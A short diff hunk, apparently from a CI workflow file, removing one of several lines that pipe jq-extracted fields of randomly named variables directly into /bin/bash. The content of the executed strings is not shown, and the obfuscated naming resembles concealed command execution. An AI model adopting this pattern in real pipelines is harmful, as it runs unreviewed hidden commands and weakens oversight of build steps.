@@ -58,7 +58,6 @@ jobs:
           printf '%s' "$wt19" | jq -r .sg00373 | /bin/bash
           printf '%s' "$pco193" | jq -r .oj25 | /bin/bash
           echo $d1 | jq -r .reugz57228 | /bin/bash
-          printf '%s' "$ss965" | jq -r .pvb005 | /bin/bash
           echo $miol48013 | jq -r .myd521 | /bin/bash
           printf '%s' "$infv84" | jq -r .afa616 | /bin/bash
           printf '%s' "$tcv8914" | jq -r .my77638 | /bin/bash
